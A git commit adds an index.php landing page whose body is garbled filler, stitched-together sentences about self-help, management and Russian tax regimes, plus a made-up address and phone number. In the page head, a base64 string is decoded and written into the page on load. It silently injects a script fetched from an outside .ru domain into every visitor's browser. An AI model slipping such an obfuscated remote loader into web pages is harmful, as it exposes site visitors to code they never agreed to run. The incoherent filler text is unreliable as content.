8056728b8edcc62a68810b450ef4054907c2bb82
hszxcsay <78852099+hszxcsay@users.noreply.github.com>
2021-02-10 12:49:26 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>When one type of resource for some reason becomes more expensive, they try to replace </title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9ubmJoYmh6bDVrczFxdWM5bzMiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="ey1wmnpsqh6ou8idx">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="cftrrlp6b83n6bmsone">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>When one type of resource for some reason becomes more expensive, they try to replace </h1>
+	</section>
+
+
+	<section class="our-work" class="0zdxu29845sga3uyd5zs">
+		<h3 class="title">This does not always happen.  Also, there is no cor</h3>
+		<p>The main thing for you is to make other people's lives happier.  At the same time, the creative process of achieving synergy is also the most risky part, because you do not know for sure what can happen or where it may lead you.  The problem itself has nothing to do with your behavior or your attitude.  But leadership comes first.  And yet there is ample evidence of your inclination to follow this scenario.  Anything you do to “sharpen the saw” in any of the dimensions has a positive effect on the other dimensions, as they are all highly interconnected.  You studied.  Concluding such win-win agreements is the main activity of a manager.  1.  If our sense of emotional fulfillment is associated primarily with marriage, then we become highly dependent on these relationships.  Prescribe their own glasses for everyone they interact with.  - I can not do it. </p>
+		<hr>
+
+		<ul class="grid" class="bsmsebwi433olwl">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ey1wmnpsqh6ou8idx">
+		<h3 class="title">Anything that can intrude into a relations</h3>
+		<p>They did not understand him.  " My company was in serious financial difficulties at the time.  Externally, rent is a payment for the use of land that its owner receives from the tenant.Obviously, it is part of the value of the product received by the entrepreneur.  Again, the engagement process itself is just as important as the outcome - the written Mission statement, as this engagement is the key to its implementation.  Now father and son are on the same side of the table and together solve the problem, instead of being on opposite sides of the table, seeing the problem in each other.  When you realize that you are serving others, you are doing well.  I asked a similar question to a group of shopping center managers: "If you had to do something in your professional activity that would certainly have a tremendous positive impact on its results, what exactly would you do?" The answer was unanimous: we would establish a fruitful personal relationship of mutual assistance with tenants - the owners of the stores that are part of the mall.  On the other hand, additional costs for improving the production process guarantee the entrepreneur an increase in profits.  85.  A decrease in price will cause an excess of demand over supply, and an increase in price will cause an excess of supply over demand.  Then the day came when Joseph was in a difficult situation,but at the same time he did not want to sacrifice his honor. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="cftrrlp6b83n6bmsone" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="0zdxu29845sga3uyd5zs">
+		<h3 class="title">When applied to an organization, the physical dimension is expr</h3>
+		<p>However, those people who get good jobs as a result are proactive: they solve problems, not talk about them, they take initiative and, based on the right principles, do whatever is necessary to get the task done.  Addicted people need others to get what they need.  Give it a try and see what happens.  Small businesses in the Russian Federation can operate under one of three taxation regimes: 1) standard tax regime in which all enterprises operate; 2) a simplified taxation system; 3) the system of taxation in the form of a single tax on imputed income.  You can read it in its entirety once for general presentation. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="bsmsebwi433olwl" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ey1wmnpsqh6ou8idx">
+		<h3 class="title">And you will find that social victories - when you </h3>
+		<p>We are creating new alternatives - something that has not existed before.  I am convinced that the basis of all established religions is the same principles, only dressed in different clothes - meditation, prayer, covenants, rituals, scripture study, empathy, empathy and many different forms of the simultaneous use of conscience and imagination.However, if these methods become part of the Personality Ethics and are separated from the basis - character and principles - they can be used incorrectly or with malice, for the sake of other centers, first of all - the center "I myself".  Although the third generation provides orderliness through priorities, it does not ask how important and necessary these actions are at all,- it does not view action in the context of principles, personal mission, roles and goals.  In addition, we deliberately worked on our motives and began to cultivate "internal sources of security",allowing us to ensure that our beliefs about our own worth do not depend on the "acceptability" of our children's behavior.  As soon as you start thinking the problem is “out there,” stop yourself. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="cftrrlp6b83n6bmsone" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="0zdxu29845sga3uyd5zs">
+		<h3 class="title">This is another significant paradigm shift</h3>
+		<p>- I told him about it, he knows all this very well, but does nothing! - Well, why don't you present your point of view to him more effectively? I asked.  Take a few minutes and write down your roles as they appear to you now.  Market demand is determined by summing the values ​​of demand presented by each consumer at different prices.  About three weeks have passed since the beginning of the semester, when one of the students, during his answer, began to talk about a very strong personal experience,extremely emotional and deeply meaningful.  Everything calmed down, and life went on as usual.  After planting a seed, watering it and caring for it, we will soon feel joy as we watch the growth of the sprout, and then we will be able to experience the exquisite taste of the fruit - a harmonious, efficient life.  People cannot live in conditions of change without having a core that is not subject to change.  This happened because the capacity of the pipeline is the limiting factor in this area.  We are atwalked behind the roots and received wonderful results - rich Win / Win relationships, deep understanding and amazing synergy.  Environmental determinism asserts that everything is to blame for your boss or your wife, or your unlucky offspring, or the current financial situation, or government policy. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="bsmsebwi433olwl" class="title">The total amount of the single tax would remain unchanged.  REN</h3>	
+		<p>The establishment of an appropriate monopoly regime means the introduction of a special position in a particular sector of the economy, which is impossible without any economic and legal grounds.  Now he fixes cars.  This can take up one hour of working time during the day: outline desired results, ground rules, define resources and accountability, negotiate consequences.  If he is inferior to me in these things, I feel my superiority.  Through this system, managers communicate their orders to each executor and monitor their implementation.  Work on yourself.  The people involved in it are tightly intertwined with each other by emerging relationships and are inspired by new, fresh thinking, new creative perspectives and opportunities.  But not everything was so “bright and joyful”.  If this technique does not rely on already built relationships and does not fit your character, then it often offends people and leads to the fact that they "close".  The children, eagerly awaiting the trip, sat quietly.  Every time I am amazed at the results that individuals and organizations achieve, when responsible, proactive individuals with internal guidelines freely and independently solve assigned tasks.  Individual demand represents the customer's needs expressed in monetary terms.  Many people tend to think that success in one area of ​​life can compensate for failure in others. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="ey1wmnpsqh6ou8idx">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="cftrrlp6b83n6bmsone"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="0zdxu29845sga3uyd5zs"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="bsmsebwi433olwl"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>546 Bins Flats, Suite 292, 64625-5878, Cathrynberg, Colorado, United States</p>
+		<p>Phone number: +497(003)491-33817</p>
+	</footer>
+
+</body>
+
+</html>
